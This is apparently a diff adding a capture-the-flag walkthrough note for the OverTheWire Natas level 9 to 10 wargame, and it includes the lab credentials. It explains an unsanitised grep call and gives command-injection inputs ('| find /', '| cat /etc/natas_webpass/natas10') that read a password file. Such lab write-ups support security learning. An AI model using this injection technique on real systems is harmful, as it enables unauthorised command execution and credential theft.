@@ -1,0 +1,14 @@
+## Natas Level 9 → Level 10
+- Go to url: http://natas9.natas.labs.overthewire.org
+    - User: natas9
+    - Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+- This level has us input text, which searches a dictionary for phrases relating to the text
+- In the source code, the user’s input is checked and appended to the command “grep -i $key dictionary.txt”
+    - Does not filter user input at all, so we can inject something into that command
+- First, try inputting “hello | find / #”, making the command “grep -i hello | find / # dictionary.txt”
+    - This finds every file in the system… out of curiosity
+    - But where in the world is the password.
+- Remembering back to level 7… the webpasses seem to be in the /etc/natas_webpass/ directory
+- Therefore, input “hello | cat /etc/natas_webpass/natas10 #”, making the command “grep -i hello | cat /etc/natas_webpass/natas10 # dictionary.txt”
+    - nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+    - Also, unfortunately, you can’t access the other passwords… :(
